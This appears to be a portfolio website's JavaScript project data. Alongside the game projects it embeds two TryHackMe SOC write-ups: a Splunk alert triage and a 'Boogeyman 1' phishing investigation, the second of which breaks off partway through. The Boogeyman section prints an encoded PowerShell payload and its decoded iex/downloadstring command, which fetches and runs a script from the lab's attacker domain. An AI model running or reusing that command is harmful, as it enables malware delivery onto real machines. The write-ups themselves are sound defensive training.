// Project data
        const projectData = {
            'project1': {
                title: 'Isometric Bow & Arrow Mechanic',
                video: 'Videos/BowAndArrowMechanic.mp4',
                description: 'A gameplay prototype exploring isometric camera control, aiming precision, and physics-driven arrow mechanics. Focused on responsive input, camera follow, and player feedback.',
                tech: ['Unity', 'C#', 'Physics'],
                features: ['Isometric camera control', 'Precision aiming system', 'Physics-driven arrow mechanics', 'Responsive player feedback'],
                extra: `<h3>What is it?</h3>
<p>This was an idea that came to me one day after thinking about game mechanics that could be useful to see in a game. The isometric bow and arrow mechanic was something I explored as part of a potential passion project using an MMORPG-style camera, aiming to support bow gameplay outside of first- or third-person perspectives.</p>
<p>The mechanic uses a fixed isometric camera where the player aims with the mouse to rotate the character toward the cursor and fires an arrow with adjustable trajectory and power. There is intentionally no UI — the goal was to see whether the mechanic could be legitimately played at its core. The result is an arcade-style experience that is easy to play, hard to master.</p>
<p>If the mechanic were to become more realistic, UI elements such as trajectory indicators, power feedback, air resistance, and draw speed would likely be required.</p>
<h3>What is Done?</h3>
<ul>
<li>Smooth following camera keeping the character centered</li>
<li>Instant, adjustable rotation toward the cursor</li>
<li>Highly precise aiming through incremental angle and power control</li>
<li>Arrows can embed into objects with precision</li>
<li>Physically arcing arrow trajectories</li>
</ul>
<h3>What did I learn?</h3>
<p>Even a seemingly simple mechanic required several supporting systems to feel smooth and responsive. Keeping the scope focused helped avoid feature creep and allowed the mechanic to be completed efficiently while still delivering meaningful results.</p>`,
                github: 'https://github.com/ckusellagussin/project1'
            },
            'cyber1': {
                title: 'Alert Triage With Splunk',
                description: 'A TryHackMe write-up investigating brute-force, persistence, and web-shell attacks as a Level 1 SOC Analyst using Splunk SPL.',
                tech: ['Splunk', 'SPL', 'TryHackMe', 'SOC'],
                features: ['Brute-force attack investigation', 'Persistence via scheduled tasks', 'Web-shell exploitation analysis', 'SPL query building'],
                extra: `<h2>Notes</h2>
<p>This is my first write-up in cybersecurity. I am at around 90% completion of TryHackMe's SOC Analyst L1 path. I have found the learning path incredibly insightful, and it has increased my excitement about entering the industry.</p>
<p>This room is a walkthrough, so some information is provided directly. Because of that, I will skim over parts of the guided content and focus more on how I answered the questions. Future write-ups will cover harder rooms or implementations completed independently.</p>

<h2>Introduction</h2>
<p>One of the main responsibilities of a SOC Analyst is alert triage through a SIEM (Security Information and Event Management) platform.</p>
<p>A SIEM aggregates data from many different sources such as EDR tools, firewalls, applications, and endpoints. That data can then be used by analysts to build alerts that support their monitoring and detection needs.</p>
<p>Splunk is a SIEM that is managed through the browser. It is widely known as one of the most popular tools because it ingests data from many different sources, has a powerful Search Processing Language (SPL), and scales well.</p>
<p>In this room, I explore different scenarios as if I were a Level 1 SOC Analyst on shift, and I also explain how I approached each scenario.</p>

<h2>Task 1</h2>
<p><strong>Description:</strong> You've just started your first shift as an analyst at an MSSP. Only a few minutes have passed since an alert about a possible brute-force attack appeared on the platform.</p>
<p><strong>Alert Details:</strong></p>
<ul>
<li><strong>Alert Name:</strong> Brute Force Activity Detection</li>
<li><strong>Time:</strong> 2025-09-17 09:00:21</li>
<li><strong>Target Host:</strong> tryhackme-2404</li>
<li><strong>Source IP:</strong> 10[.]10[.]242[.]248</li>
</ul>
<p>Your job is to investigate this activity and decide whether it should be considered suspicious.</p>
<p>Before diving into the issue, the information provided suggests there should be many alerts indicating that a single IP is attempting to gain access to an account or service. These alerts would likely include messages such as "Wrong Password" or "Access Denied." The fact that the IP address is within the 10.0.0.0-10.255.255.255 range means it is a private IP address, which suggests the source is already inside the network in some way.</p>
<p>The task walkthrough shows the search queries used to investigate the brute-force activity, including searches for login messages associated with the source IP address. The next query identified how many attempts each user made, and it showed that a user called <strong>john.smith</strong> had a large number of attempts against the target host, with a successful login eventually occurring. This means the alert is a true positive and requires further investigation into what the attacker did after gaining access.</p>
<p>Questions to think about include:</p>
<ul>
<li>Why did the attacker have a private IP address?</li>
<li>How did the attacker obtain the information needed to brute-force accounts?</li>
<li>What did the attacker do after gaining access?</li>
</ul>

<h3>Question 1</h3>
<p><strong>Question:</strong> How many failed login attempts were made on the user john.smith?</p>
<p><strong>Walkthrough:</strong> We already know that john.smith is the affected account, so all that is needed is a search query for events containing john.smith and failed-password activity.</p>
<pre><code>index="linux-alert" user="john.smith" "Failed Password"</code></pre>
<img src="Images/Pasted image 20260528163344.png" alt="Pasted image 20260528163344.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>The results show 500 events.</p>
<p><strong>Answer: 500</strong></p>

<h3>Question 2</h3>
<p><strong>Question:</strong> What was the duration of the brute-force attack in minutes?</p>
<p><strong>Walkthrough:</strong> Just below the search bar, there is a timeline showing all relevant events and when john.smith first became the focus of the brute-force activity.</p>
<p>All of the green bars add up to 500 events
<img src="Images/Pasted image 20260528163918.png" alt="Pasted image 20260528163918.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">, and each full bar represents 1 minute. I first answered 6 minutes because that is what Splunk appeared to show, but the correct answer was 5 after rounding down.</p>
<p><strong>Answer: 5</strong></p>

<h3>Question 3</h3>
<p><strong>Question:</strong> What username was the attacker able to privilege escalate to?</p>
<p><strong>Walkthrough:</strong> For a user to privilege escalate, they need suitable permissions. Because the attack is on a Linux machine, commands such as <code>sudo</code> or <code>su</code> would commonly be used to gain elevated privileges.</p>
<pre><code>index="linux-alert" john.smith sudo OR su</code></pre>
<img src="Images/Pasted image 20260528170759.png" alt="Pasted image 20260528170759.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>john.smith is no longer tied only to the <code>user</code> field, because alerts that included <code>user: john.smith</code> would be shown and a broader search is more useful here. The results show that a session was opened for root, which means the attacker obtained root access.</p>
<p><strong>Answer: root</strong></p>

<h3>Question 4</h3>
<p><strong>Question:</strong> What is the name of the user account created by the attacker for persistence?</p>
<p><strong>Walkthrough:</strong> It was already established that john.smith used <code>sudo</code> to gain root privileges, so the new user was likely created through either <code>sudo adduser</code> or <code>sudo useradd</code>.</p>
<pre><code>index="linux-alert" (useradd OR adduser)</code></pre>
<img src="Images/Pasted image 20260528172613.png" alt="Pasted image 20260528172613.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>I found an event linked with <strong>john.smith</strong> and <code>adduser</code>, which showed that the new account was <strong>system-utm</strong>.</p>
<p><strong>Answer: system-utm</strong></p>

<h2>Task 2</h2>
<p>This task focuses on persistence, which involves an attacker maintaining access to a system, server, or application so they can return later to achieve their goals.</p>
<p><strong>Description:</strong> You are working as a Level 1 SOC Analyst on shift at an MSSP. An alert has come through indicating that a suspicious scheduled task was created on a host.</p>
<p><strong>Alert Details:</strong></p>
<ul>
<li><strong>Alert Name:</strong> Potential Task Scheduler Identified</li>
<li><strong>Time:</strong> 2025-08-30 10:06:07</li>
<li><strong>Host:</strong> WIN-H015</li>
<li><strong>User:</strong> oliver.thompson</li>
<li><strong>Task Name:</strong> AssessmentTaskOne</li>
</ul>
<p>Your job is to investigate this activity and decide whether it should be considered suspicious.</p>
<p>At first glance, this appears to be a newly created task, so there is not much to work with immediately. My first thought was that the attacker may have created or abused a user account with the privileges they needed, similar to the previous task.</p>
<p>The walkthrough suggests not diving too deeply too early. Instead, it asks whether the host is a workstation or a server, what role the user has, and when the activity occurred. In this case, the host is a workstation, the user is a systems engineer with elevated privileges, and the event occurred during working hours. However, 30 August 2025 was a Saturday, which makes it more likely that an attacker had gained access to Oliver's account.</p>
<p>The walkthrough then uses a search query to find the scheduled-task event. The task shows that it runs every day at a certain time and was created under the account <strong>oliver.thompson</strong>. The next section of the log shows that the scheduled task runs a PowerShell command using <code>certutil</code>, which is built into Windows and can download files without requiring external tools. The command downloads an executable called <code>datacollector.exe</code> into the temp folder, and it is configured to run under <strong>oliver.thompson</strong>.</p>

<h3>Question 1</h3>
<p><strong>Question:</strong> What is the ProcessId of the process that created this malicious task?</p>
<p><strong>Walkthrough:</strong> This is straightforward and uses the following query:</p>
<pre><code>index="win-alert" datacollector.exe processid:</code></pre>
<img src="Images/Pasted image 20260528181828.png" alt="Pasted image 20260528181828.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>Only one event appears, and the ProcessId is highlighted in the results.</p>
<p><strong>Answer: 5816</strong></p>

<h3>Question 2</h3>
<p><strong>Question:</strong> What is the name of the parent process for the process that created this malicious task?</p>
<p><strong>Walkthrough:</strong> The required event has already been identified. By scrolling to the bottom, the <strong>ParentCommandLine</strong> field shows that it was executed by <code>cmd.exe</code>.</p>
<img src="Images/Pasted image 20260528182207.png" alt="Pasted image 20260528182207.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p><strong>Answer: cmd.exe</strong></p>

<h3>Question 3</h3>
<p><strong>Question:</strong> Which local group did the attacker enumerate during discovery?</p>
<p><strong>Walkthrough:</strong> Another query was needed, so I used:</p>
<pre><code>index="win-alert" oliver.thompson group name</code></pre>
<img src="Images/Pasted image 20260528182802.png" alt="Pasted image 20260528182802.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>The first event provided the required information, showing that the attacker enumerated the <strong>Administrators</strong> group.</p>
<p><strong>Answer: Administrators</strong></p>

<h3>Question 4</h3>
<p><strong>Question:</strong> What is the name of the workstation from which the threat actor logged into this host?</p>
<p><strong>Walkthrough:</strong> This was another simple query:</p>
<pre><code>index="win-alert" oliver.thompson workstation:</code></pre>
<img src="Images/Pasted image 20260528183110.png" alt="Pasted image 20260528183110.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>There are only five events. The first is the original host machine, while the other events show <strong>DEV-QA-SERVER</strong>.</p>
<p><strong>Answer: DEV-QA-SERVER</strong></p>

<h2>Task 3</h2>
<p>This task focuses on investigating possible web-shell exploitation on a vulnerable web server.</p>
<p>Your shift as an L1 analyst continues, and you've now received the next alert that needs to be investigated. This time, the activity is related to the web.</p>
<p><strong>Alert Details:</strong></p>
<ul>
<li><strong>Alert Name:</strong> Potential Web Shell Upload Detected</li>
<li><strong>Time:</strong> 2025-09-14 09:31:51</li>
<li><strong>Resource:</strong> http://web.trywinme.thm</li>
<li><strong>Suspicious IP:</strong> 171[.]251[.]232[.]40</li>
</ul>
<p>Your job is to investigate this activity and decide whether it should be considered suspicious.</p>
<p>Before looking at the walkthrough, my first thought was that the attacker may have implemented command-and-control activity so they could maintain communication with the server and execute commands to achieve their goals. This user is not impersonating anyone within the company, so the activity clearly appears to be from an external malicious actor.</p>
<p>The walkthrough begins by focusing on where the attack is taking place. It is targeting the website hosted on the web server. The suspicious IP is the next focal point, and the walkthrough shows a lookup on AbuseIPDB that reports the IP address as having a history of malicious activity.</p>
<img src="Images/Pasted image 20260529083013.png" alt="Pasted image 20260529083013.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>The walkthrough then uses a search query to learn more about the attacker on the web server by checking the IP address, the tool used, the targeted URL path, and HTTP 200 status codes that indicate successful page requests. The tool used to gain access was Hydra Network Login Tool, but that still does not identify the web-shell exploitation tool itself.</p>
<p>The walkthrough then becomes more specific in trying to identify the tool used for the web-shell activity, because the initial results did not show it clearly. Later, it finds a file related to the activity because the relevant events show four POST requests to the same file. The file is named <code>b374k.php</code>.</p>
<p>At that point, the file name was searched online, and the results indicated that it is associated with a known web shell. Based on that information, the alert is treated as a true positive and warrants further investigation.</p>

<h3>Question 1</h3>
<p><strong>Question:</strong> What time did the brute-force activity using Hydra begin?</p>
<p><strong>Walkthrough:</strong> We already know the IP address and the tool that was used, so the search query can be fairly simple:</p>
<pre><code>index="web-alert" clientip="171.251.232.40" useragent="Mozilla/5.0 (Hydra)"
| sort +_time</code></pre>
<p>By using the information already known and sorting for the earliest event, the first matching result reveals the date and time.</p>
<img src="Images/Pasted image 20260529091117.png" alt="Pasted image 20260529091117.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p><strong>Answer: 2025-09-14 21:20:27</strong></p>

<h3>Question 2</h3>
<p><strong>Question:</strong> Which user agent did the attacker use when interacting with the web shell?</p>
<p><strong>Walkthrough:</strong> The required information is already available. The IP address is known, and the <code>.php</code> file name is also known. The Hydra user agent is removed from the search focus so that the user agent tied to the web-shell interaction can be identified instead.</p>
<pre><code>index="web-alert" clientip="171.251.232.40" b374k.php
| table _time clientip useragent</code></pre>
<img src="Images/Pasted image 20260529092730.png" alt="Pasted image 20260529092730.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>Only five events appear, and they all contain the same value in the <code>useragent</code> field.</p>
<p><strong>Answer: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</strong></p>

<h3>Question 3</h3>
<p><strong>Question:</strong> What was the number of requests made by the attacker to the server via the web shell?</p>
<p>We already have the events where the attacker interacted with the web shell, but the table can be made clearer so the request method is easier to identify.</p>
<pre><code>index="web-alert" clientip="171.251.232.40" b374k.php
| table _time clientip useragent method
| sort -method</code></pre>
<img src="Images/Pasted image 20260529092730.png" alt="Pasted image 20260529092730.png" style="max-width:100%; border-radius:6px; margin:0.75rem 0;" loading="lazy">
<p>This query returns the same five events, but only four of them use the POST method, which means the attacker interacted with the web shell four times.</p>
<p><strong>Answer: 4</strong></p>

<h2>Final Thoughts</h2>
<p>This room taught me not to dive into the investigation too quickly. Even though a lot of information was provided in this room, a real-world situation would not present the same level of guidance.</p>
<p>This room is marked as medium difficulty, but it felt easier than other medium rooms because so much information was already provided. One of the most useful takeaways was seeing how the search queries became more specific as more information was uncovered about the attackers and their methods, which gave me better insight into how SOC Analyst L1s operate.</p>`,
                github: 'https://github.com/ckusellagussin/project1'
            },
            'project2': {
                title: 'Interactive Portfolio',
                embed: true,
                iframe: 'https://itch.io/embed-upload/12306557?color=333333',
                description: 'A fully playable Unity-based interactive portfolio presented as a museum-style experience. Players explore rooms showcasing my skills, experience, and current projects.',
                tech: ['Unity', 'C#', 'WebGL', 'Blender'],
                features: ['Playable interactive experience', 'Museum-style presentation', 'Embedded HTML5 portfolio', 'Runs directly in-browser'],
                extra: `<h3>What is it?</h3>
<p>The interactive portfolio was designed to be placed on the front page of the website to demonstrate my Unity skills and provide a more engaging experience for users viewing my portfolio. The level presents information about myself while showcasing my ability to create a lightweight application that can be played directly in the browser.</p>
<h3>What is done?</h3>
<p>The level currently consists of five rooms, separated into an introduction, about me, employment, portfolio, and current projects. Interactivity is included in the form of free movement through the level, similar to a museum experience, as well as interactive buttons that open external links and reveal additional information.</p>
<h3>What did I learn?</h3>
<p>This project involved significant learning in level design, 3D modelling, and lighting design. The environment and several 3D models were created in Blender, while lighting was authored and baked within the Unity Editor. Lighting required the most iteration and experimentation to achieve the desired result. Programming was used to implement player movement and button-based interactivity. Overall, 3D modelling was the skill that improved the most throughout this project.</p>`,
                github: 'https://github.com/ckusellagussin/project2'
            },
            'project3': {
                title: 'Project Bloodlines',
                video: 'Videos/ProjectBloodlines.mp4',
                description: 'An ambitious RPG project exploring character lineage systems and generational gameplay mechanics. Features dynasty management and inherited traits across multiple generations.',
                tech: ['Unity', 'C#', 'RPG Systems'],
                features: ['Smooth RPG interaction', 'Character lineage system', 'Generational gameplay mechanics'],
                extra: `<h3>What is it?</h3>
<p>The plan is to create an Action CRPG hybrid that combines the RPG elements of <i>Baldur's Gate</i>, <i>Tyranny</i>, and <i>Knights of the Old Republic</i> with the combat systems found in <i>Mount &amp; Blade</i>, <i>Exanima</i>, and <i>Mordhau</i>.</p>
<h3>What has been done so far?</h3>
<p>To avoid feature creep, I defined a clear set of systems and mechanics that needed to be completed before moving on to core gameplay. Milestone 1 has now been reached, which includes the following:</p>
<ul>
<li>Camera system</li>
<li>Context menu for interactions and information</li>
<li>Dynamic movement state system</li>
<li>Stamina and fatigue system</li>
<li>RPG menu windows for structured information display</li>
</ul>
<h3>What have I learned so far and what will I learn?</h3>
<p>Project Bloodlines marks my first significant project developed in Unreal Engine, excluding smaller tutorial-based learning projects.</p>
<ul>
<li>Developed strong familiarity with Blueprints, which have been the primary focus so far</li>
<li>Planning to integrate C++ alongside Blueprints for improved performance and scalability</li>
<li>Gained substantial experience in UI design, an area not previously explored in other engines</li>
<li>Currently learning Unreal Engine's physics system in preparation for combat implementation</li>
</ul>`,
                github: 'https://github.com/ckusellagussin/project3'
            },
            'project4': {
                title: "God's Oversight",
                video: 'Videos/RimworldFinalProject.mp4',
                description: 'A Rimworld mod where colonists gain unique abilities based on traits and percentage tiers. Focused on systems design, XML modding, and iterative balancing.',
                tech: ['C#', 'XML Editor', 'dnSpy'],
                features: ['Trait-based ability system', 'Percentage tier progression', 'Balanced gameplay integration', 'XML configuration system'],
                extra: `<h3>God's Oversight</h3>
<p><strong>A RimWorld Mod</strong></p>
<h3>What is it?</h3>
<p>God's Oversight is my final project for the BSc Computing and Video Game Development course. The aim of the COMP 3000 module was to demonstrate the ability to build upon knowledge acquired throughout previous years of study.</p>
<p>The goal of this project was to prove I could design and implement a system within a foreign codebase. The resulting mod introduces a trait-based power system where colonists gain abilities based on their personal traits, using a percentage-based tier system to determine outcomes.</p>
<h3>What did I learn?</h3>
<ul>
<li>RimWorld modding does not involve using the Unity editor</li>
<li>Mods must be tested by saving source files and reloading the game for each iteration</li>
<li>Source files are accessed by decompiling the game into separate XML files</li>
<li>Locating specific functionality requires searching through individual source elements</li>
<li>Limited official documentation necessitated extensive exploration of the game's codebase</li>
<li>The project was initially planned to continue beyond university</li>
<li>A later expansion pack significantly expanded upon the concepts explored in the mod. It remains unclear whether the mod influenced the expansion's design</li>
</ul>
<h3>Downloads and Awards</h3>
<p>The mod reached the Steam Workshop front page for top subscribers of the week, achieving a peak subscriber count of <strong>505 users</strong>. It currently holds a <strong>3/5 star rating</strong> based on <strong>26 ratings</strong>, with strong positive engagement within the comments section.</p>`,
                github: 'https://github.com/ckusellagussin/project4'
            },
            'project5': {
                title: 'Pathfinder',
                video: 'Videos/Pathfinder.mp4',
                description: 'A pathfinding algorithm implementation with visual debugging and optimization techniques. Demonstrates A* algorithm with various heuristics and grid-based navigation.',
                tech: ['Unity', 'C#', 'AI'],
                features: ['A* pathfinding implementation', 'Visual debugging tools', 'Multiple heuristic options', 'Performance optimization'],
                extra: `<h3>What is it?</h3>
<p>Pathfinder is a mini-game created during an in-house game jam at Sports Interactive. The game jam was designed to encourage colleagues from all disciplines to get involved and become familiar with the Unity game engine, which <i>Football Manager 2025</i> is being developed in.</p>
<p>Pathfinder was designed as one of several mini-games in a WarioWare-style experience. The game focuses on controlling a ball and navigating past moving obstacles that attempt to touch the player, which results in a game over. The objective is to successfully guide the ball into the goal to complete the mini-game.</p>
<h3>What was done?</h3>
<ul>
<li>Implemented basic movement using physics forces rather than direct translation</li>
<li>Created obstacle AI with randomized patrol behavior constrained by level boundaries</li>
<li>Implemented a detection system using cone-shaped raycasts to trigger chase behavior</li>
<li>Designed obstacle interactions that temporarily disable the player for 5 seconds to prevent clumping</li>
</ul>
<h3>What did I learn?</h3>
<p>The game jam was a valuable team-based development experience. It provided insight into collaborative game design and rapid prototyping within a professional environment.</p>
<ul>
<li>First hands-on experience using Perforce for version control and live asset check-in/out</li>
<li>Improved understanding of teamwork and coordination during short development cycles</li>
<li>Learned about AI navigation using NavMesh systems</li>
<li>Gained experience with layer masking to differentiate between environment, allies, and enemies</li>
<li>Developed deeper knowledge of raycasting as a core but performance-sensitive gameplay tool</li>
</ul>`,
                github: 'https://github.com/ckusellagussin/project5'
            }
            ,
        'boogeyman1': {
            title: 'Boogeyman 1',
            description: 'A TryHackMe write-up covering packet analysis, DNS extraction, and decoding exfiltrated data with CyberChef.',
            tech: ['TryHackMe', 'tshark', 'CyberChef', 'KeePass2'],
            features: ['Packet capture analysis', 'DNS exfiltration artifact extraction', 'Hex decoding via CyberChef', 'KeePass2 credential recovery'],
            extra: `<h2>Boogeyman 1</h2>
<blockquote><p>Room Overview <strong>Description:</strong> A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman?</p></blockquote>
<h2>Notes</h2>
<p>This is my second write-up within cybersecurity. I have used TryHackMe's SOC Analyst L1 path so I can gain a strong foundational knowledge of what it takes to be one. So far, I'm having a fun time. I've been doing the rooms daily because the job requires complex problem-solving skills, which gives me satisfaction when I find a solution to a problem. My first write-up was Splunk Alert Triage, which I personally thought was a bit easy, but I have heard much about the Boogeyman series of rooms and the challenge they can provide, so I am looking forward to this.</p>
<h2>Introduction</h2>
<p>In this room, I am told I should have previous knowledge of phishing analysis and foundational Wireshark knowledge. I'm pleased to have done modules based around both, and I hope to apply what I learned.</p>
<p>The room comes with a copy of a phishing email, PowerShell logs from the victim's workstation (Julianne), and a packet capture from the workstation.</p>
<p>I have been given a selection of tools as well, such as Thunderbird, LNKParse3, Wireshark, tshark, and jq.</p>
<h2>Artifacts Used</h2>
<ul>
<li><code>dump.eml</code></li>
<li><code>Invoice_20230103.lnk</code></li>
<li><code>powershell.json</code></li>
<li><code>capture.pcapng</code></li>
</ul>
<h2>Task 1</h2>
<p>Task 1 introduces the room's objective. Julianne, a finance employee working at a logistics company, received an email about an unpaid invoice from a business partner. The document that came with the email was malicious and compromised her PC.</p>
<img src="Images/Pasted%20image%2020260603183531.png" alt="Pasted image 20260603183531.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The security team flagged the execution of the attachment, and it seems that the finance department was the target of the attack. The security team did some OSINT research and found out that the attack is linked to a threat group called Boogeyman.</p>
<p>The first task is about analysing the <code>dump.eml</code> file to inspect the email headers of the malicious email. I am given two methods to investigate the <code>dump.eml</code>; I picked the one that involves opening the file via Thunderbird and then using <code>lnkparse</code> to extract information from the file.</p>
<h3>Question 1</h3>
<p><strong>Question:</strong> What is the email address used to send the phishing email?</p>
<p><strong>Walkthrough:</strong> I opened the file through Thunderbird and was greeted with the usual content of an email, including the supposed name of the sender and the email address.</p>
<img src="Images/Pasted%20image%2020260603191048.png" alt="Pasted image 20260603191048.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>agriffin@bpakcaging[.]xyz</code></p>
<h3>Question 2</h3>
<p><strong>Question:</strong> What is the email address of the victim?</p>
<p><strong>Walkthrough:</strong> The email address of the victim is also in the image just below the sender.</p>
<p><strong>Answer:</strong> <code>julianne.westcott@hotmail[.]com</code></p>
<h3>Question 3</h3>
<p><strong>Question:</strong> What is the name of the third-party mail relay service used by the attacker based on the <code>DKIM-Signature</code> and <code>List-Unsubscribe</code> headers?</p>
<p><strong>Walkthrough:</strong> This information can be obtained by reading the message source.</p>
<img src="Images/Pasted%20image%2020260603191706.png" alt="Pasted image 20260603191706.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>There is a lot of information within this message source, so we can perform a Control + F search for:</p>
<pre><code>DKIM-Signature</code></pre>
<img src="Images/Pasted%20image%2020260603192108.png" alt="Pasted image 20260603192108.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>We find the section we need, and since we're looking for the third-party mail relay service, we can use the information to deduce that the service is Elastic Email.</p>
<p><strong>Answer:</strong> <code>elasticemail</code></p>
<h3>Question 4</h3>
<p><strong>Question:</strong> What is the name of the file inside the encrypted attachment?</p>
<p><strong>Walkthrough:</strong> This question involves opening the zip file that came with the email. Extracting files from a <code>.zip</code> file is normally safe, but some files might not actually be zip files, so it is helpful to have the full file name or have your file browser display the actual file type to avoid hidden executions.</p>
<img src="Images/Pasted%20image%2020260603194508.png" alt="Pasted image 20260603194508.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<blockquote><p> I am using a virtual machine supplied by TryHackMe for this room, and everyone who needs to analyse malware should do so as well, even if they are using a sandbox for dynamic testing.</p></blockquote>
<img src="Images/Pasted%20image%2020260603194602.png" alt="Pasted image 20260603194602.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The payload is indeed a <code>.zip</code> file, and we can see the name of the file.</p>
<p><strong>Answer:</strong> <code>Invoice_20230103.lnk</code></p>
<h3>Question 5</h3>
<p><strong>Question:</strong> What is the password of the encrypted attachment?</p>
<p><strong>Walkthrough:</strong> This was supplied by the attacker in the email sent to the victim.</p>
<img src="Images/Pasted%20image%2020260603194824.png" alt="Pasted image 20260603194824.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>Invoice2023!</code></p>
<h3>Question 6</h3>
<p><strong>Question:</strong> Based on the result of the <code>lnkparse</code> tool, what is the encoded payload found in the Command Line Arguments field?</p>
<p><strong>Walkthrough:</strong> After extracting the file from the <code>.zip</code> by using the supplied password, we can use LNKParse3 to view the contents of the file. LNKParse3 is a package that can parse <code>.lnk</code> files to extract hidden data, which is why it is a popular digital forensics tool.</p>
<img src="Images/Pasted%20image%2020260603195546.png" alt="Pasted image 20260603195546.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>After a bit of online research, we can use the command:</p>
<pre><code>lnkparse Invoice_20230103.lnk</code></pre>
<p>to parse the information into a readable format and grab useful information such as the command-line execution that comes with opening the file.</p>
<img src="Images/Pasted%20image%2020260603195811.png" alt="Pasted image 20260603195811.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>We see an encoded payload found within the command-line arguments.</p>
<p><strong>Answer:</strong> <code>aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA</code></p>
<p>I haven't been asked yet, but I decided to decode the payload using CyberChef. I initially had difficulty decoding it because using <strong>From Base64</strong> alone was not enough. The string needed to be decoded as UTF-16LE after Base64 decoding.</p>
<pre><code>iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')</code></pre>
<p>This is what I decoded. This line downloads a script from the internet and runs it.</p>
<h2>Task 2</h2>
<p>We have found out so far that Julianne's workstation was compromised by opening a file that downloaded scripts from a website. However, we still do not know what those scripts are or what they do, and that is what this task is about.</p>
<p>We can find this out by analysing the PowerShell logs that were supplied to us.</p>
<h3>Question 1</h3>
<p><strong>Question:</strong> What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. <code>a.domain.com,b.domain.com</code>)</p>
<p><strong>Walkthrough:</strong> For this question, I am shown a few commands I can use in conjunction with jq, which is a command-line JSON processor. This package can make JSON formatting human-readable, as pages of JSON-formatted fields can be quite unappealing to read.</p>
<img src="Images/Pasted%20image%2020260603204235.png" alt="Pasted image 20260603204235.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>I played around with a few commands and read some of the events that appeared. The formatting of the domain had already been presented to us, so all I did was search for <code>.com</code> with the search function, and I was able to find a few domains within the <code>ScriptBlockText</code> field. I didn't want to find the results this way, so I found what I needed using the command line:</p>
<pre><code>cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}'</code></pre>
<p>The cheat sheet helped me search for the field I needed in the order the events appeared. There was still quite a lot of data to scroll through, and I realized I had unintentionally found a domain that was not related to file hosting, but I also found another domain related to the decoded file host from the other question.</p>
<img src="Images/Pasted%20image%2020260603212301.png" alt="Pasted image 20260603212301.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<img src="Images/Pasted%20image%2020260603212432.png" alt="Pasted image 20260603212432.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>cdn.bpakcaging.xyz,files.bpakcaging.xyz</code></p>
<h3>Question 2</h3>
<p><strong>Question:</strong> What is the name of the enumeration tool downloaded by the attacker?</p>
<p><strong>Walkthrough:</strong> Regarding the other domain name I found in the previous question, I found a GitHub repository a bit later in the log file. I should have realised earlier that the GitHub repository was not being used for file hosting because the line began with <code>iex</code>, which is used like the other command-line argument to execute scripts from a website. We just want the tool name, not the whole URL.</p>
<img src="Images/Pasted%20image%2020260603213122.png" alt="Pasted image 20260603213122.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p><strong>Answer:</strong> <code>Seatbelt</code></p>
<h3>Question 3</h3>
<p><strong>Question:</strong> What is the file accessed by the attacker using the downloaded <code>sq3.exe</code> binary? Provide the full file path with escaped backslashes.</p>
<p><strong>Walkthrough:</strong> This one was a bit tricky to find, and the reason is that the full answer is split into sections.</p>
<img src="Images/Pasted%20image%2020260603215744.png" alt="Pasted image 20260603215744.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<p>The attacker was changing the directory to get into certain folder locations bit by bit. They had to enter a password to get into these locations until they used the downloaded <code>sq3.exe</code> binary once they found the file they needed.</p>
<img src="Images/Pasted%20image%2020260603220201.png" alt="Pasted image 20260603220201.png" loading="lazy" style="max-width:50%;height:auto;border-radius:8px;margin:0.75rem 0;display:block;">
<pre><code>AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\LocalState\\\\plum.sqlite</code></pre>
